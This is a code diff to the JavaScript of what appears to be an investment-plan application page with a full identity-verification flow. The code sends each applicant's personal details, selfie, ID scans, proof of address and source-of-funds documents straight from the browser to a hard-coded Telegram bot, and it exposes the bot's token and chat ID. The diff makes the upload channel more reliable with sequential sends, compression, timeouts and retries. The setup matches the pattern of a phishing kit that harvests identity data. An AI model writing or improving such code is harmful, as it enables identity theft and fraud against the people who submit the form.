@@ -21,8 +21,6 @@ const formData = {};
     const matched = planMap[planParam.toLowerCase()];
     if (matched) formData.plan = matched;
   }
-  // Optional: pre-fill step to jump straight to financial if plan chosen
-  // (currently starts at step 0 always for full KYC flow)
 })();
 
 // ─── BUILD STEP HEADER ────────────────────────────────────────────────────────
@@ -526,7 +524,6 @@ function selectPlan(el, plan) {
 }
 
 // ─── FILE HANDLERS ────────────────────────────────────────────────────────────
-// Maps input IDs to formData keys so files survive DOM re-renders
 const FILE_KEY_MAP = {
   f_photo:   'file_photo',
   f_idFront: 'file_idFront',
@@ -538,10 +535,7 @@ const FILE_KEY_MAP = {
 function handleFile(input, zoneId, prevId) {
   if (!input.files.length) return;
   const file = input.files[0];
-
-  // Persist File object so it survives step/DOM changes
   if (FILE_KEY_MAP[input.id]) formData[FILE_KEY_MAP[input.id]] = file;
-
   const zone = document.getElementById(zoneId);
   const prev = document.getElementById(prevId);
   if (zone) zone.style.borderColor = 'var(--green)';
@@ -554,7 +548,6 @@ function handleFile(input, zoneId, prevId) {
 
 function removeFile(inputId, zoneId, prevId) {
   document.getElementById(inputId).value = '';
-  // Clear saved File object too
   if (FILE_KEY_MAP[inputId]) delete formData[FILE_KEY_MAP[inputId]];
   const zone = document.getElementById(zoneId);
   const prev = document.getElementById(prevId);
@@ -565,10 +558,7 @@ function removeFile(inputId, zoneId, prevId) {
 function handlePhoto(input) {
   if (!input.files.length) return;
   const file = input.files[0];
-
-  // Persist File object
   if (FILE_KEY_MAP[input.id]) formData[FILE_KEY_MAP[input.id]] = file;
-
   const reader = new FileReader();
   reader.onload = e => {
     const img = document.getElementById('photoImg');
@@ -628,18 +618,23 @@ function prevStep() {
 }
 
 // ─── SUBMIT ───────────────────────────────────────────────────────────────────
-function submitApplication() {
+async function submitApplication() {
   const chkTerms = document.getElementById('chk_terms');
-  const chkKyc = document.getElementById('chk_kyc');
-  const chkRisk = document.getElementById('chk_risk');
+  const chkKyc   = document.getElementById('chk_kyc');
+  const chkRisk  = document.getElementById('chk_risk');
   if (!chkTerms?.checked || !chkKyc?.checked || !chkRisk?.checked) {
-    showToast('Please accept all agreements to continue.'); return;
+    showToast('Please accept all agreements to continue.');
+    return;
   }
+
+  // Disable button to prevent double-submit
+  const submitBtn = document.querySelector('.btn-submit');
+  if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = '⏳  Submitting…'; }
 
   const refId = 'GBX-' + Date.now().toString(36).toUpperCase().slice(-6);
   formData.refId = refId;
 
-  // ── Telegram HTML message (bold labels, plain values) ──
+  // ── Telegram HTML message ──
   const planEmoji = { Bronze:'🥉', Silver:'🥈', Gold:'🥇', Platinum:'💎' };
   const pe = planEmoji[formData.plan] || '📊';
   const nl = '\n';
@@ -692,9 +687,11 @@ function submitApplication() {
     `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
     `✅ <b>STATUS:</b> Awaiting KYC Review`;
 
-  sendTelegramMessage(msg);
-  sendTelegramDocuments();
+  // ── FIX 3: sequential await — message first, then documents ──
+  await sendTelegramMessage(msg);
+  await sendTelegramDocuments();
 
+  // ── Show success screen ──
   const panel = document.getElementById('formPanel');
   panel.innerHTML = `
     <div class="success-panel">
@@ -708,7 +705,7 @@ function submitApplication() {
       <div class="success-steps">
         <div class="success-step">
           <div class="success-step-icon">📧</div>
-          <div><div class="success-step-text">You'll Receive an Email</div><div class="success-step-sub">An Emaill Will Be Sent to ${formData.email} after final verification</div></div>
+          <div><div class="success-step-text">You'll Receive an Email</div><div class="success-step-sub">An Email Will Be Sent to ${formData.email} after final verification</div></div>
         </div>
         <div class="success-step">
           <div class="success-step-icon">⏳</div>
@@ -729,81 +726,200 @@ function submitApplication() {
   window.scrollTo({top:0,behavior:'smooth'});
 }
 
-// ─── TELEGRAM ────────────────────────────────────────────────────────────────
+// ─── TELEGRAM CONFIG ─────────────────────────────────────────────────────────
 const TG_TOKEN = "8974754656:AAHp4FyrkVXFpZqKr2Ti8yhc5sk4gO3AKBE";
-const TG_CHAT = "7637163658";
-const TG_BASE = `https://api.telegram.org/bot${TG_TOKEN}`;
+const TG_CHAT  = "7637163658";
+const TG_BASE  = `https://api.telegram.org/bot${TG_TOKEN}`;
 
-// Send the formatted HTML text message
-async function sendTelegramMessage(text) {
-  try {
-    await fetch(`${TG_BASE}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TG_CHAT,
-        text,
-        parse_mode: 'HTML'
-      })
-    });
-  } catch(e) { console.error('Telegram message error:', e); }
+// ─── HELPER: sleep ────────────────────────────────────────────────────────────
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// Send a single file to Telegram with a caption
-async function sendTelegramFile(file, caption) {
+// ─── FIX 7: fetch with 30-second abort timeout ───────────────────────────────
+async function fetchWithTimeout(url, options, timeoutMs = 30000) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), timeoutMs);
   try {
+    const response = await fetch(url, { ...options, signal: controller.signal });
+    return response;
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+// ─── SEND TEXT MESSAGE ────────────────────────────────────────────────────────
+async function sendTelegramMessage(text) {
+  try {
+    const res = await fetchWithTimeout(`${TG_BASE}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+    });
+    if (!res.ok) {
+      const err = await res.json().catch(() => ({}));
+      console.error('Telegram sendMessage failed:', res.status, err);
+    }
+  } catch (e) {
+    if (e.name === 'AbortError') {
+      console.error('sendTelegramMessage timed out after 30s');
+    } else {
+      console.error('sendTelegramMessage error:', e);
+    }
+  }
+}
+
+// ─── FIX 2: IMAGE COMPRESSION ────────────────────────────────────────────────
+// Resizes images to max 1400px wide, converts to JPEG at quality 0.7.
+// PDFs are returned unchanged.
+function compressImage(file) {
+  return new Promise((resolve) => {
+    // Pass PDFs straight through — no compression
+    if (file.type === 'application/pdf') {
+      resolve(file);
+      return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const img = new Image();
+      img.onload = () => {
+        const MAX_WIDTH = 1400;
+        let { width, height } = img;
+
+        // Only scale down if wider than MAX_WIDTH
+        if (width > MAX_WIDTH) {
+          height = Math.round((height * MAX_WIDTH) / width);
+          width  = MAX_WIDTH;
+        }
+
+        const canvas = document.createElement('canvas');
+        canvas.width  = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(img, 0, 0, width, height);
+
+        canvas.toBlob(
+          (blob) => {
+            if (!blob) { resolve(file); return; } // fallback to original if compression fails
+            // Keep original filename but force .jpg extension for clarity
+            const compressedName = file.name.replace(/\.[^.]+$/, '') + '_compressed.jpg';
+            const compressedFile = new File([blob], compressedName, { type: 'image/jpeg' });
+            console.log(
+              `Compressed ${file.name}: ${(file.size / 1024).toFixed(0)} KB → ${(compressedFile.size / 1024).toFixed(0)} KB`
+            );
+            resolve(compressedFile);
+          },
+          'image/jpeg',
+          0.7   // quality
+        );
+      };
+      img.onerror = () => resolve(file); // fallback to original on decode error
+      img.src = e.target.result;
+    };
+    reader.onerror = () => resolve(file); // fallback to original on read error
+    reader.readAsDataURL(file);
+  });
+}
+
+// ─── FIX 4: SEND SINGLE FILE (with retry + better error handling) ─────────────
+async function sendTelegramFile(file, caption, attempt = 1) {
+  try {
+    // Compress images before upload
+    const fileToSend = await compressImage(file);
+
     const fd = new FormData();
     fd.append('chat_id', TG_CHAT);
     fd.append('caption', caption);
     fd.append('parse_mode', 'HTML');
 
-    // Use sendPhoto for images, sendDocument for PDFs
-    const isImage = file.type.startsWith('image/');
-    const endpoint = isImage ? 'sendPhoto' : 'sendDocument';
-    fd.append(isImage ? 'photo' : 'document', file, file.name);
+    const isImage   = fileToSend.type.startsWith('image/');
+    const endpoint  = isImage ? 'sendPhoto' : 'sendDocument';
+    fd.append(isImage ? 'photo' : 'document', fileToSend, fileToSend.name);
 
-    await fetch(`${TG_BASE}/${endpoint}`, { method: 'POST', body: fd });
-  } catch(e) { console.error('Telegram file error:', e); }
+    const res = await fetchWithTimeout(`${TG_BASE}/${endpoint}`, {
+      method: 'POST',
+      body: fd
+    });
+
+    if (res.ok) {
+      console.log(`✅ Sent: ${file.name} (attempt ${attempt})`);
+      return true;
+    }
+
+    // Telegram returned a non-OK HTTP status — parse and log the error body
+    let errBody = {};
+    try { errBody = await res.json(); } catch (_) {}
+    console.error(`❌ Telegram rejected ${file.name} [HTTP ${res.status}]:`, errBody);
+
+    // FIX 4: Retry once on first failure
+    if (attempt === 1) {
+      console.warn(`↩️  Retrying ${file.name} in 2 seconds…`);
+      await sleep(2000);
+      return sendTelegramFile(file, caption, 2);
+    }
+
+    return false;
+
+  } catch (e) {
+    if (e.name === 'AbortError') {
+      console.error(`⏰ Upload timed out for ${file.name} (attempt ${attempt})`);
+    } else {
+      console.error(`❌ Upload error for ${file.name} (attempt ${attempt}):`, e);
+    }
+
+    // Retry once on network / timeout error
+    if (attempt === 1) {
+      console.warn(`↩️  Retrying ${file.name} in 2 seconds…`);
+      await sleep(2000);
+      return sendTelegramFile(file, caption, 2);
+    }
+
+    return false;
+  }
 }
 
-// Gather all uploaded files and send them one by one
+// ─── FIX 1: SEQUENTIAL DOCUMENT UPLOADS (for…of + 1.2s delay) ───────────────
 async function sendTelegramDocuments() {
-  const refId = formData.refId;
+  const refId         = formData.refId;
   const applicantName = `${formData.firstName||''} ${formData.lastName||''}`.trim();
 
-  // Read from formData (File objects saved on upload, survive DOM re-renders)
   const docSlots = [
     { key: 'file_photo',   label: '📷 <b>Selfie / Profile Photo</b>' },
-    { key: 'file_idFront', label: '🪪 <b>ID Front</b>' },
-    { key: 'file_idBack',  label: '🪪 <b>ID Back</b>' },
-    { key: 'file_poa',     label: '🏠 <b>Proof of Address</b>' },
-    { key: 'file_sof',     label: '💵 <b>Source of Funds Proof</b>' },
+    { key: 'file_idFront', label: '🪪 <b>ID Front</b>'               },
+    { key: 'file_idBack',  label: '🪪 <b>ID Back</b>'                },
+    { key: 'file_poa',     label: '🏠 <b>Proof of Address</b>'       },
+    { key: 'file_sof',     label: '💵 <b>Source of Funds Proof</b>'  },
   ];
 
-  const uploadPromises = [];
+  let sentCount = 0;
 
-for (const slot of docSlots) {
-  const file = formData[slot.key];
-  if (!(file instanceof File)) continue;
+  // ── Sequential loop — one file at a time with a 1.2s gap ──
+  for (const slot of docSlots) {
+    const file = formData[slot.key];
+    if (!(file instanceof File)) continue; // skip slots with no upload
 
-  const caption =
-    `${slot.label}\n` +
-    `Applicant: ${applicantName}\n` +
-    `Ref ID: ${refId}`;
+    const caption =
+      `${slot.label}\n` +
+      `Applicant: ${applicantName}\n` +
+      `Ref ID: ${refId}`;
 
-  uploadPromises.push(sendTelegramFile(file, caption));
-}
+    const success = await sendTelegramFile(file, caption);
+    if (success) sentCount++;
 
-// send all at once (parallel)
-await Promise.all(uploadPromises);
+    // 1.2-second pause between uploads to avoid Telegram rate-limiting
+    await sleep(1200);
+  }
 
-  // If no docs were uploaded at all, send a note
+  // If no documents were uploaded at all, send a notice
   if (sentCount === 0) {
     await sendTelegramMessage(
       `📎 <b>DOCUMENTS</b>\n` +
       `<b>Ref:</b> ${refId}\n` +
       `⚠️ No documents were uploaded by the applicant.`
     );
+  } else {
+    console.log(`📎 Document upload complete: ${sentCount} file(s) sent.`);
   }
 }
 
